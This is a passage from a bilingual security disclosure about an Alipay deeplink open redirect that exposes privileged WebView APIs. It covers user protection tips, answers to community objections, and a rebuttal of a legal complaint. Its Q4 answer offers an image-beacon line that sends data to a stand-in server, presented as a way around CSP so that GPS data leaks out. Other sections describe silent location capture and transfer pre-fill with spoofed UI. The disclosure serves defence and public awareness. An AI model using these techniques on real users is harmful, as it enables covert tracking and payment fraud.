
ITIF is ranked by the University of Pennsylvania as the **world's most authoritative science and technology policy think tank**. The article independently identifies Alipay as collecting "purchase histories, device locations, government IDs, health data, and biometric markers," and calls for FTC and CFPB audits. It cites China's National Intelligence Law Article 7, noting the government can legally compel companies to share collected data.

This entirely independent assessment is highly consistent with our technical findings: **when a whitelist bypass allows arbitrary attackers to obtain users' GPS and device information, data sovereignty risks are amplified further**.

## 🛡️ 用户自我保护指南 User Self-Protection Guide

在厂商修复这些问题之前，普通用户可以采取以下措施降低风险：

Until the vendor addresses these issues, ordinary users can take the following steps to reduce risk:

|  # |  措施Measure |  说明Description |  防护范围Coverage |   |
|  1 |  **不点击陌生链接****Don't click unknown links** |  收到含 `ds.alipay.com` 或 `alipays://` 的链接时保持警惕，尤其是来自群聊、短信、邮件的链接Be cautious with links containing `ds.alipay.com` or `alipays://`, especially from group chats, SMS, or emails |  全部漏洞All vulnerabilities |   |
|  2 |  **关闭定位权限****Disable location permission** |  在系统设置中将支付宝的定位权限改为"仅在使用时允许"或"关闭"，需要时临时开启In system settings, change Alipay's location permission to "While Using" or "Off"; enable temporarily when needed |  GPS 静默外泄Silent GPS exfiltration |   |
|  3 |  **验证转账信息****Verify transfer details** |  任何弹出的转账/付款页面，务必仔细核对收款方信息，不要因为页面看起来"正常"就直接确认For any transfer/payment page that appears, carefully verify recipient information — don't confirm just because the page "looks normal" |  转账预填攻击Transfer pre-fill attack |   |
|  4 |  **关闭小额免密****Disable small-amount password-free payments** |  设置 → 支付设置 → 免密支付 → 关闭小额免密。确保每笔支付都需要密码/指纹确认Settings → Payment Settings → Password-free Payment → Disable. Ensure every payment requires password/biometric confirmation |  支付接口调用Payment interface invocation |   |
|  5 |  **保持应用更新****Keep app updated** |  如果厂商悄悄修复了部分问题（有社区反馈表明部分接口已变化），更新到最新版可获得保护If the vendor silently patches issues (community feedback suggests some APIs have changed), updating to the latest version provides protection |  已修补的接口Patched interfaces |   |

## 💬 社区质疑回应 Community Questions & Responses

本研究在 [GitHub](https://github.com/sgInnora/alipay-deeplink-research/issues/4)、[V2EX](https://www.v2ex.com/t/1198033)、[LINUX DO](https://linux.do/t/topic/1746089) 等平台引发了专业讨论。我们感谢所有参与技术讨论的安全从业者，并在此逐条回应主要质疑。

This research has sparked professional discussions on [GitHub](https://github.com/sgInnora/alipay-deeplink-research/issues/4), [V2EX](https://www.v2ex.com/t/1198033), [LINUX DO](https://linux.do/t/topic/1746089) and other platforms. We thank all security professionals who participated in the technical discussion and address the main questions below.

###  Q1：「DeepLink / URL Scheme 是正常设计，不算漏洞」 Q1: "DeepLink / URL Scheme is normal design, not a vulnerability"

来源：GitHub Issue #4 (sevck), V2EX (Puteulanus)

**我们同意：**DeepLink 机制本身是移动生态的通用设计。我们从未将「DeepLink 存在」定义为漏洞。

**但核心问题是：**支付宝自有域名 `ds.alipay.com` 的**开放重定向**允许**任何人**通过白名单域名将**任意外部页面**加载到支付宝的特权 WebView 中，获得完整的 JSBridge API 访问权限。这不是「DeepLink 存在」的问题，而是**安全边界被完全突破**。

- [CWE-601 (URL重定向到不可信站点)](https://cwe.mitre.org/data/definitions/601.html) 是 OWASP Top 10 明确认定的漏洞类型
- [CWE-939 (自定义URL Scheme处理器中的不当授权)](https://cwe.mitre.org/data/definitions/939.html) 也是标准漏洞分类
- [Google Android 安全文档](https://developer.android.com/privacy-and-security/risks/unsafe-use-of-deeplinks)明确将 Deep Link 的不安全使用列为安全风险

类比：门锁是正常设计。但如果任何人可以用一张纸条打开你家门锁，那就是门锁的安全漏洞——不是「门锁这种设计不算漏洞」。

Source: GitHub Issue #4 (sevck), V2EX (Puteulanus)

**We agree:** DeepLink is a standard mechanism in the mobile ecosystem. We never defined "the existence of DeepLink" as a vulnerability.

**But the core issue is:** Alipay's own domain `ds.alipay.com` has an **open redirect** that allows **anyone** to load **arbitrary external pages** into Alipay's privileged WebView via the whitelisted domain, gaining full JSBridge API access. This is not about "DeepLink existing" — it is about the **security boundary being completely breached**.

- [CWE-601 (URL Redirection to Untrusted Site)](https://cwe.mitre.org/data/definitions/601.html) is explicitly classified as a vulnerability in OWASP Top 10
- [CWE-939 (Improper Authorization in Handler for Custom URL Scheme)](https://cwe.mitre.org/data/definitions/939.html) is a standard vulnerability classification
- [Google Android Security docs](https://developer.android.com/privacy-and-security/risks/unsafe-use-of-deeplinks) explicitly list unsafe use of Deep Links as a security risk

Analogy: A door lock is a normal design. But if anyone can open your door lock with a slip of paper, that's a vulnerability in the lock — not "door locks aren't vulnerabilities."

###  Q2：「GPS 获取在用户已授权权限的前提下是正常行为」 Q2: "GPS access under existing user permissions is normal behavior"

来源：GitHub Issue #4 (sevck, rama2910****10)

**这是一个权限委托 vs 权限滥用的问题。**

| 场景 | 用户期望 | 实际行为 |  |
| 用户授权支付宝使用 GPS | 支付宝自身功能使用 | ✅ 正常 |  |
| 外部攻击者通过 WebView 获取 GPS | 不在用户预期内 | ❌ 权限滥用 |  |
| 标准浏览器请求用户位置 | 弹窗请求确认 | ✅ W3C 标准行为 |  |
| 支付宝 WebView 中外部页面请求位置 | 应当弹窗确认 | ❌ 无弹窗，静默获取 |  |

正如参与讨论的 nailchu 所指出的：*「我授权是授给你支付宝的，攻击方想拿就拿算怎么个事儿？就算浏览器也会跳'该网站正在请求位置信息'啊」*

用户把位置权限授予支付宝，是信任**支付宝**——不是信任任何能够加载到支付宝 WebView 中的随机网页。当攻击者的页面可以通过白名单绕过进入 WebView 并静默调用 `getLocation`，这就是对用户信任的滥用。

**实测证据**：308 条服务器日志记录了从 3 台真实设备静默获取的 GPS 坐标（8.8m 精度），7 秒内完成，0 次用户交互。GitHub Issue #5 的 freshnn 也独立确认 Android 上「无感 GPS」成功。

Source: GitHub Issue #4 (sevck, rama2910****10)

**This is a question of permission delegation vs. permission abuse.**

| Scenario | User Expectation | Actual Behavior |  |
| User grants Alipay GPS permission | Used by Alipay's own functions | ✅ Normal |  |
| External attacker accesses GPS via WebView | Not within user's expectation | ❌ Permission abuse |  |
| Standard browser requests location | Shows confirmation dialog | ✅ W3C standard |  |
| External page in Alipay WebView requests location | Should show dialog | ❌ No dialog, silent access |  |

As nailchu pointed out in the discussion: *"I authorized Alipay, not any attacker who wants my location. Even browsers show 'This website is requesting your location.'"*

When users grant location permission to Alipay, they trust **Alipay** — not any random webpage that can be loaded into Alipay's WebView. When an attacker's page enters the WebView via whitelist bypass and silently calls `getLocation`, this is an abuse of user trust.

**Evidence**: 308 server log entries documenting GPS coordinates silently obtained from 3 real devices (8.8m accuracy), completed in 7 seconds, with 0 user interactions. freshnn on GitHub Issue #5 also independently confirmed "silent GPS" works on Android.

###  Q3：「转账预填需要用户确认，类似 Chrome 表单预填」 Q3: "Transfer pre-fill requires user confirmation, similar to Chrome form auto-fill"

来源：GitHub Issue #4 (sevck, rama2910****10)

**我们部分同意：**转账确实需要用户至少 2 次点击 + 密码/生物认证确认，不能自动完成。本报告已在相关章节明确标注此前提条件。

**但 Chrome 类比不准确：**

- Chrome 预填的是**用户自己保存的**表单数据 — 攻击者无法指定预填内容
- 支付宝的预填是**攻击者通过 URL 参数指定**收款账号和金额 — 性质完全不同
- 结合 UI 欺骗能力（`setTitle`/`showToast`），攻击者可以伪造合法转账理由，降低用户警惕

一位参与讨论的独立安全研究者编写了 PoC，结论：*「还是认为这个功能是漏洞，但是危害性会低一些」*。该研究者还引用了 [CVE-2024-40676](https://github.com/advisories/GHSA-88q7-6vxh-w5q7)（Android 先例）：减少用户交互步骤本身可以构成漏洞。

Source: GitHub Issue #4 (sevck, rama2910****10)

**We partially agree:** Transfers indeed require at least 2 clicks + password/biometric confirmation and cannot complete automatically. This precondition is already explicitly stated in the relevant sections of this report.

**But the Chrome analogy is inaccurate:**

- Chrome auto-fills data **previously saved by the user** — attackers cannot specify the pre-filled content
- Alipay's pre-fill is **specified by the attacker via URL parameters** for recipient account and amount — fundamentally different
- Combined with UI spoofing (`setTitle`/`showToast`), attackers can fabricate legitimate-looking transfer reasons, reducing user vigilance

An independent security researcher wrote a PoC and concluded: *"I still consider this a vulnerability, but with lower severity."* The researcher also cited [CVE-2024-40676](https://github.com/advisories/GHSA-88q7-6vxh-w5q7) (Android precedent): reducing user interaction steps itself can constitute a vulnerability.

###  Q4：「iOS 上无法复现数据外泄」 Q4: "Cannot reproduce data exfiltration on iOS"

来源：GitHub Issue #5 (freshnn)

freshnn 报告 iOS 可以调用并打开相关页面，但服务端收不到数据；Android 上「无感 GPS」则复现成功。

**可能原因：**

- **HTTPS 混合内容阻止** — 如果 PoC 页面在 HTTPS 的支付宝 WebView 中加载，而数据外传目标是 HTTP，WKWebView 会直接阻止请求发出（注意：这会阻止 request 本身，不只是 response）
- **CSP connect-src 限制** — 支付宝 WebView 可能设置了 CSP 的 `connect-src` 指令，阻止向外部域发送请求
- **解决方案** — 使用 Image beacon（`new Image().src = "https://server/log?data=..."`）属于 simple request 且不受 `connect-src` 限制
- **支付宝版本差异** — 不同版本的 JSBridge 鉴权策略可能不同，建议使用最新版测试

*技术修正：感谢 [meooxx](https://github.com/sgInnora/alipay-deeplink-research/issues/5#issuecomment-4060****30) 指出 CORS 是浏览器端策略——它阻止的是浏览器读取 response，不阻止 request 到达服务器。对于 simple request，服务器一定会收到请求。*

**关键事实：**我们的 iPhone 16 Pro (iOS 18.3) 测试**确实成功**获取了 GPS 数据（记录在服务器日志中），蚂蚁集团安全负责人的 iPhone 在杭州的测试也被我们成功获取了坐标。iOS 复现需要满足特定的服务器配置条件，并非漏洞不存在。

我们将在 [Issue #5](https://github.com/sgInnora/alipay-deeplink-research/issues/5) 中提供详细的 iOS 复现排查指南。

Source: GitHub Issue #5 (freshnn)

freshnn reported that iOS can invoke and open the relevant pages, but the server receives no data; Android "silent GPS" was successfully reproduced.

**Possible causes:**

- **HTTPS mixed content blocking** — If the PoC page loads in Alipay's HTTPS WebView but the exfiltration target is HTTP, WKWebView will block the request entirely (this blocks the request itself, not just the response)
- **CSP connect-src restriction** — Alipay's WebView may set CSP `connect-src` directives that block requests to external domains
- **Solution** — Use Image beacon (`new Image().src = "https://server/log?data=..."`) which is a simple request not restricted by `connect-src`
- **Alipay version differences** — Different versions may have different JSBridge authentication policies; test with the latest version

*Technical correction: Thanks to [meooxx](https://github.com/sgInnora/alipay-deeplink-research/issues/5#issuecomment-4060****30) for pointing out that CORS is a browser-side policy — it blocks the browser from reading the response, not the request from reaching the server. For simple requests, the server always receives the request.*

**Key fact:** Our iPhone 16 Pro (iOS 18.3) test **did successfully** obtain GPS data (recorded in server logs). Ant Group's security lead's iPhone in Hangzhou was also successfully captured. iOS reproduction requires specific server configuration — the vulnerability exists, but the PoC setup matters.

We will provide a detailed iOS reproduction troubleshooting guide in [Issue #5](https://github.com/sgInnora/alipay-deeplink-research/issues/5).

###  Q5：「这是浏览器通用设计问题，不是支付宝特有问题」 Q5: "This is a general browser design issue, not specific to Alipay"

来源：V2EX (Puteulanus)

**支付宝 WebView ≠ 标准浏览器。**关键区别：

| 能力 | 标准浏览器 | 支付宝 WebView (Nebula) |  |
| 位置请求 | 弹窗确认 | 静默获取 |  |
| 支付接口 | 无 | tradePay 可调用 |  |
| 内部页面导航 | 无 | startApp 可跳转敏感页面 |  |
| 设备指纹 | 标准 User-Agent | IMEI/品牌/型号/运营商 |  |
| UI 控制 | 受限 | setTitle/showToast 可伪造 |  |

白名单的存在本身就证明支付宝**自己认为**需要限制哪些页面可以访问这些特权 API。绕过白名单 = 绕过**支付宝自己设定的安全边界**。

Source: V2EX (Puteulanus)

**Alipay WebView ≠ standard browser.** Key differences:

| Capability | Standard Browser | Alipay WebView (Nebula) |  |
| Location request | Confirmation dialog | Silent access |  |
| Payment API | None | tradePay callable |  |
| Internal navigation | None | startApp navigates to sensitive pages |  |
| Device fingerprint | Standard User-Agent | IMEI/Brand/Model/Carrier |  |
| UI control | Limited | setTitle/showToast spoofable |  |

The very existence of the whitelist proves that Alipay **itself recognizes** the need to restrict which pages can access these privileged APIs. Bypassing the whitelist = bypassing **Alipay's own security boundary**.

###  独立验证与机构背书 Independent Verification & Institutional Recognition

本研究的有效性已获得多个独立第三方的验证：

- **Packet Storm Security** — 审核通过并发布 [Advisory #217089](https://packetstormsecurity.com/files/217089)
- **MITRE** — 受理 36 个 CVE 申请 (11 tickets)
- **Apple Product Security** — 主动启动调查 (Case OE0105****3014)
- **Google Play** — 启动政策违规调查 (Case 9-7515****0640)
- **CSSF 卢森堡** — 4 个部门确认收到，ICT Risk Supervision 明确记录
- **PDPC 新加坡** — 启动正式数据保护调查 (#006****24)
- **CIRCL 卢森堡 CERT** — 事件处理人员主动代为联系 Alibaba SRC
- **HKMA 香港金管局** — 立案调查 (Case CE2026****5412)
- **独立安全研究者**（GitHub）— 独立编写 PoC 后确认漏洞存在
- **freshnn**（GitHub 用户）— 独立确认 Android 无感 GPS 复现成功

The validity of this research has been verified by multiple independent third parties:

- **Packet Storm Security** — Reviewed and published [Advisory #217089](https://packetstormsecurity.com/files/217089)
- **MITRE** — 36 CVE submissions across 11 tickets acknowledged
- **Apple Product Security** — Proactively launched investigation (Case OE0105****3014)
- **Google Play** — Policy violation investigation (Case 9-7515****0640)
- **CSSF Luxembourg** — 4 departments confirmed receipt, ICT Risk Supervision explicitly noted
- **PDPC Singapore** — Formal data protection investigation (#006****24)
- **CIRCL Luxembourg CERT** — Incident handler proactively contacted Alibaba SRC on our behalf
- **HKMA Hong Kong** — Case filed (CE2026****5412)
- **Independent researcher** (GitHub) — Independently wrote PoC and confirmed vulnerability exists
- **freshnn** (GitHub user) — Independently confirmed silent GPS reproduction on Android

## ⚖️ 法律投诉回应 Legal Complaint Response

**投诉单号：**[已隐藏]

**投诉时间：**2026-03-11 22:45:59（文章发布仅4小时29分钟后）

**投诉方：**北京格韵律师事务所（证件号 31110000MD0196493T）

**投诉分类：**内容侵犯名誉/商誉/隐私/肖像

**投诉平台：**微信公众平台

### 我们的立场：投诉不成立

**1. 文章未指名任何企业** — 我们在微信公众号发布的文章全文零次出现"支付宝""Alipay""蚂蚁集团"或任何可识别特定企业的名称。根据《民法典》第1024条，名誉权/商誉侵权需满足"针对特定主体"的构成要件。投诉方通过主动投诉，反而自行确认了文章内容与其委托人的关联性。

**2. 内容属实且有完整证据链** — 根据《民法典》第1025条，行为人为公共利益实施舆论监督，影响他人名誉的，不承担民事责任，前提是内容属实且未超出合理限度。我们的文章基于308条服务器日志、3台真实设备测试、42张截图。所有结论均可独立复现验证。

**3. 厂商安全团队亲自验证了漏洞** — 在私下报告阶段，厂商安全团队指派业务负责人与我们协同验证。该人员使用自有 iPhone 16 Pro 在杭州测试时，GPS 坐标被直接回传至我们的服务器，**全程无任何 GPS 授权弹窗**。这直接推翻了投诉方"调用位置权限均以弹窗告知用户"的主张。此次验证还发现 iOS 版本攻击面显著大于 Android——额外暴露 tradePay（支付SDK）、share（蠕虫传播）等 5 个敏感 API。

**4. 厂商自身定性消除侵权基础** — 厂商安全团队在亲自验证上述事实后，仍于2026年3月10日回复"这些属于正常功能"。讨论一款应用的"正常功能"从逻辑上不可能构成"商誉侵权"。当企业明知风险存在而选择不修复，再通过法律手段阻止公众知情——这不是维权，这是掩盖。

**5. 消费者知情权** — 《消费者权益保护法》第八条规定：消费者享有知悉其购买、使用的商品或者接受的服务的真实情况的权利。当10亿+用户的支付工具存在可被外部链接利用的功能设计时，安全研究和公众讨论属于正当行使公共监督权。

**6. 负责任披露程序完整合规** — 我们在公开前进行了4轮私下报告（2026-02-25至2026-03-07），等待厂商回应至明确答复"正常功能"。参照 ISO/IEC 29147:2018 和 Google Project Zero 90天标准，我们的程序完全合规。

我们已向微信公众平台提交完整申诉材料。如投诉方对技术事实有异议，欢迎通过第三方技术鉴定机构验证。

**详细反驳文章：**《[支付宝安全研究遭律师函投诉——一篇零次提及"支付宝"的文章如何构成"商誉侵权"？](https://innora.ai/zfb/rebuttal.html)》

**Complaint #:** [redacted]

**Filed:** 2026-03-11 22:45:59 (only 4 hours 29 minutes after article publication)

**Complainant:** Beijing Geyun Law Firm (License: 31110000MD0196493T)

**Category:** Content infringing reputation/goodwill/privacy/likeness

**Platform:** WeChat Official Account Platform

### Our Position: The Complaint Has No Merit

**1. The article names no company** — Our WeChat article contains zero mentions of "Alipay," "支付宝," "Ant Group," or any identifiable corporate name. Under PRC Civil Code Article 1024, reputation infringement requires targeting a "specific subject." By filing this complaint, the complainant effectively self-identified their client as the article's subject.

**2. All content is factual and evidence-backed** — Under PRC Civil Code Article 1025, one shall not bear civil liability for supervising public interest when the content is truthful and does not exceed reasonable limits. Our article is based on 308 server logs, testing across 3 real devices, and 42 screenshots. All findings are independently reproducible.

**3. The vendor's own security team verified the vulnerability** — During the private reporting phase, the vendor assigned a security business lead to coordinate and verify our findings. When this person tested on their own iPhone 16 Pro in Hangzhou, GPS coordinates were transmitted directly to our server with **no authorization prompt whatsoever**. This directly contradicts the complainant's claim that "location access always prompts the user." This verification also revealed that the iOS attack surface is significantly larger than Android — exposing 5 additional sensitive APIs including tradePay (payment SDK) and share (worm propagation vector).

**4. The vendor's own classification eliminates infringement** — After personally verifying all the above facts, the vendor's security team still responded on 2026-03-10: "These are normal features." Discussing an app's "normal features" cannot logically constitute "reputation infringement." When a company knowingly ignores verified risks and then uses legal means to suppress public awareness — that is not rights protection, it is concealment.

**5. Consumer right to know** — PRC Consumer Rights Protection Law Article 8 guarantees consumers the right to know the true conditions of products and services they use. When a payment tool used by 1B+ users has features exploitable via external links, security research and public discussion serve the legitimate public interest.

**6. Responsible disclosure fully compliant** — We submitted 4 rounds of private reports (2026-02-25 to 2026-03-07) before public disclosure. We waited for the vendor's explicit response ("normal features"). Per ISO/IEC 29147:2018 and Google Project Zero's 90-day standard, our process is fully compliant.

We have submitted complete appeal materials to the WeChat platform. If the complainant disputes the technical facts, we welcome verification through an independent third-party technical assessment.

**Full rebuttal article:** [How Can an Article That Never Mentions "Alipay" Constitute "Reputation Infringement"?](https://innora.ai/zfb/rebuttal.html)

##  法律声明与免责 Legal Notice & Disclaimer

### 研究性质声明

- 本研究完全出于安全研究和教育目的，符合《宪法》第四十七条规定的科学研究自由。
- 所有测试均在研究者自己的设备和自有账户上进行，未对任何第三方系统造成损害。
- 研究团队为独立安全研究机构，不从事支付业务，与任何竞品企业不存在商业利益关系。

### 负责任披露合规声明

- 在公开发布之前，已通过4轮私下报告（2026-02-25至2026-03-07）向厂商提交全部发现及修复建议。
- 厂商于2026-03-10正式回复"属于正常功能"，明确拒绝修复。
- 研究者在厂商明确关闭对话后公开研究结果，符合 ISO/IEC 29147:2018 负责任披露标准。
- 公开内容均为厂商已知的技术事实，不构成"未经授权发布网络安全信息"（《网络安全法》第26条）。

### 法律依据

- **《民法典》第1025条**：为公共利益实施舆论监督，内容属实且未超出合理限度的，不承担民事责任。
- **《消费者权益保护法》第8条**：消费者享有知悉其使用的服务真实情况的权利。
- **《民法典》第1024条**：名誉权侵权需针对特定主体——本文未指名任何企业。
- **CVSS 3.1**：国际通用漏洞评分体系明确认定"需用户交互"的安全问题仍属有效安全发现。

### 内容安全声明

- 本文不包含任何可直接用于攻击的完整 PoC 代码（关键参数已脱敏）。
- 在线演示页面为只读展示，已禁用全部数据外传功能。
- 我们对每个发现都诚实标注了验证状态，包括防护生效的部分。
- 文章中涉及资金操作的描述均明确注明"仍需用户手动确认"。

### Research Nature Statement

- This research was conducted solely for security research and educational purposes, in accordance with the freedom of scientific research guaranteed by Article 47 of the PRC Constitution.
- All testing was performed on the researcher's own devices and accounts. No third-party systems were harmed.
- The research team is an independent security research institution with no payment business and no commercial interest with any competing enterprise.

### Responsible Disclosure Compliance

- All findings and remediation suggestions were submitted to the vendor through 4 rounds of private reports (2026-02-25 to 2026-03-07) before any public disclosure.
- The vendor officially responded on 2026-03-10 with "normal functionality," explicitly declining to remediate.
- Public disclosure occurred only after the vendor explicitly closed the dialogue, in compliance with ISO/IEC 29147:2018 responsible disclosure standards.
- Published content covers only technical facts already known to the vendor and does not constitute "unauthorized publication of cybersecurity information" (Cybersecurity Law Article 26).

### Legal Basis

- **PRC Civil Code Article 1025**: One shall not bear civil liability for supervising public interest when content is truthful and does not exceed reasonable limits.
- **Consumer Rights Protection Law Article 8**: Consumers have the right to know the true conditions of services they use.
- **PRC Civil Code Article 1024**: Reputation infringement requires targeting a specific subject — this article names no company.
- **CVSS 3.1**: The international vulnerability scoring system explicitly recognizes "user interaction required" findings as valid security issues.

### Content Safety Statement

- This article does not contain any complete PoC code that could be directly used for attacks (critical parameters are sanitized).
- Online demonstration pages are read-only with all data exfiltration functionality disabled.
- We honestly labeled the verification status of each finding, including parts where defenses are effective.
- All descriptions involving financial operations explicitly note "user manual confirmation still required."

##  联系我们 Contact

如果蚂蚁集团在阅读本文后希望进一步沟通、请求澄清或要求更新特定内容，请发送邮件至 **[[email protected]](https://innora.ai/cdn-cgi/l/email-protection)**。如果相关问题在后续版本中得到修复，我们将及时更新本文并标注修复状态。

如果其他安全研究人员对本文中的技术分析有疑问或想要交流，同样欢迎联系。

If Ant Group wishes to discuss further, request clarification, or ask for specific content updates after reading this article, please email **[[email protected]](https://innora.ai/cdn-cgi/l/email-protection)**. If the issues discussed here are addressed in future versions, we will promptly update this article with the fix status.

Other security researchers with questions about the technical analysis or who wish to exchange findings are also welcome to reach out.
